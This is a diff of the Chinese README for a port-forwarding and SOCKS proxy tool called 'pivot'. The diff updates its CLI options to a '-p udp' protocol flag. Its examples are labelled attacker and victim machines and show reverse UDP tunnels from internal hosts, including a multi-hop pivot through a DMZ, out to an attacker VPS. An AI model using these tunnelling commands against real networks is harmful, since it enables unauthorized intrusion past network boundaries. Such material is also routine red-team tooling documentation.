@@ -64,11 +64,11 @@ Port forwarding mode
 Usage: pivot fwd [OPTIONS]
 
 Options:
-  -l, --local <LOCAL>    Local listen IP address, format: [+][IP:]PORT
-  -r, --remote <REMOTE>  Remote connect IP address, format: [+]IP:PORT
-  -s, --socket <SOCKET>  Unix domain socket path
-  -u, --udp              Enable UDP forward mode
-  -h, --help             Print help
+  -l, --locals <LOCALS>      Local listen IP address, format: [+][IP:]PORT
+  -r, --remotes <REMOTES>    Remote connect IP address, format: [+]IP:PORT
+  -s, --socket <SOCKET>      Unix domain socket path
+  -p, --protocol <PROTOCOL>  Forward Protocol [default: tcp] [possible values: tcp, udp]
+  -h, --help                 Print help (see more with '--help')
 ```
 
 Socks 代理模式
@@ -81,7 +81,7 @@ Socks proxy mode
 Usage: pivot proxy [OPTIONS]
 
 Options:
-  -l, --local <LOCAL>    Local listen IP address, format: [+][IP:]PORT
+  -l, --locals <LOCALS>  Local listen IP address, format: [+][IP:]PORT
   -r, --remote <REMOTE>  Reverse server IP address, format: [+]IP:PORT
   -a, --auth <AUTH>      Authentication info, format: user:pass (other for random)
   -h, --help             Print help
@@ -161,9 +161,9 @@ Options:
 
 ### UDP 端口转发
 
-UDP 的端口转发与 TCP 类似, 只需要添加 `-u` 参数.
+UDP 的端口转发与 TCP 类似, 只需要添加 `-p udp` 参数.
 
-目前这个功能还在实验性阶段, 可能不太稳定.
+**目前这个功能还在实验性阶段, 可能不太稳定.**
 
 注意在**反向** UDP 端口转发时, 会通过发送 handshake 握手包的形式来记住客户端地址.
 
@@ -171,10 +171,10 @@ UDP 的端口转发与 TCP 类似, 只需要添加 `-u` 参数.
 
 ```bash
 # 攻击者机器
-./pivot fwd -l 8888 -l 9999
+./pivot fwd -l 8888 -l 9999 -p udp
 
 # 受害者机器
-./pivot fwd -r 10.0.0.1:53 -r vps:8888
+./pivot fwd -r 10.0.0.1:53 -r vps:8888 -p udp
 ```
 
 受害者机器会向 `vps:8888` (即攻击者机器) 发送一个 4 字节的握手包 (内容全为 0).
@@ -187,13 +187,13 @@ UDP 的端口转发与 TCP 类似, 只需要添加 `-u` 参数.
 
 ```bash
 # A 机器 (10.0.0.1, 192.168.1.1, intranet)
-./pivot fwd -r 10.0.0.10:53 -l 7777
+./pivot fwd -r 10.0.0.10:53 -l 7777 -p udp
 
 # B 机器 (192.168.1.2, DMZ)
-./pivot fwd -r 192.168.1.1:7777 -r vps:8888 # 这句命令需要在最后执行
+./pivot fwd -r 192.168.1.1:7777 -r vps:8888 -p udp # 这句命令需要在最后执行
 
 # 攻击者机器
-./pivot fwd -l 8888 -l 9999
+./pivot fwd -l 8888 -l 9999 -p udp
 ```
 
 握手包将从 B 机器发送到攻击者机器 (8888 端口). 用户可以通过端口 9999 连接到内网.
